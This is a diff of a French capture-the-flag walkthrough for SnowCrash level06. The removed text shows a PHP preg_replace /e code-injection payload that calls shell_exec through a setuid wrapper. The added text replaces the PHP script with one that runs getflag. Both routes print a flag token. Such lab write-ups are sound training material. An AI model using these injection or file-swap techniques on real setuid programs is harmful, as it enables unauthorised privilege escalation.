@@ -16,52 +16,48 @@ Dans le fichier level06, rws signifie lecture-écriture-exécution + setuid. Cel
 
 </br></br>
 
-## d'exécution level06
+## level06
 
-```sh
-level06@SnowCrash:~$ ./level06
-PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+```bash
+level06@SnowCrash:~$ strace ./level06
+...
+...
+mprotect(0xb7fcf000, 8192, PROT_READ)   = 0
+mprotect(0x8049000, 4096, PROT_READ)    = 0
+mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
+munmap(0xb7fd5000, 21440)               = 0
+brk(0)                                  = 0x804b000
+brk(0x806c000)                          = 0x806c000
+getegid32()                             = 2006
+geteuid32()                             = 2006
+setresgid32(2006, 2006, 2006)           = 0
+setresuid32(2006, 2006, 2006)           = 0
+execve("/usr/bin/php", ["/usr/bin/php", "/home/user/level06/level06.php", "", ""], [/* 21 vars */]) = 0
+...
+...
 ```
-</br></br>
 
-## level06.php
+level06 execute le fichier level06.php avec les privilèges root
 
-```php
-level06@SnowCrash:~$ cat ./level06.php
+```
+level06@SnowCrash:~$ chomod 777 .
+level06@SnowCrash:~$ ls
+level06  level06.php
+level06@SnowCrash:~$ rm -rf level06.php
+level06@SnowCrash:~$ ls
+level06
+level06@SnowCrash:~$ vim level06.php
+level06@SnowCrash:~$ ls
+level06  level06.php
+level06@SnowCrash:~$ cat level06.php
 #!/usr/bin/php
+
 <?php
-function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
-function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
-$r = x($argv[1], $argv[2]); print $r;
+echo exec('getflag');
 ?>
-```
-</br></br>
+level06@SnowCrash:~$ ./level06
 
-## regex and shell_exec
-reg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
-
-regex : (\[x (.*)\])
-
-#To match the regex our string must start by "[x" and finish by "]"
-
-[x {${shell_exec(getflag)}}]
-
-</br></br>
-
-## make file 
-```sh
-level06@SnowCrash:~$ mkdir /tmp/level06
-level06@SnowCrash:~$ echo '[x {${shell_exec(getflag)}}]' > /tmp/level06/flag06
-```
-
-</br></br>
-
-## execute level06 with file flag06
-```sh
-level06@SnowCrash:~$ ./level06 /tmp/level06/flag06 
-PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
-PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
- in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 level06@SnowCrash:~$ su level07
-Password: 
+Password:
 ```
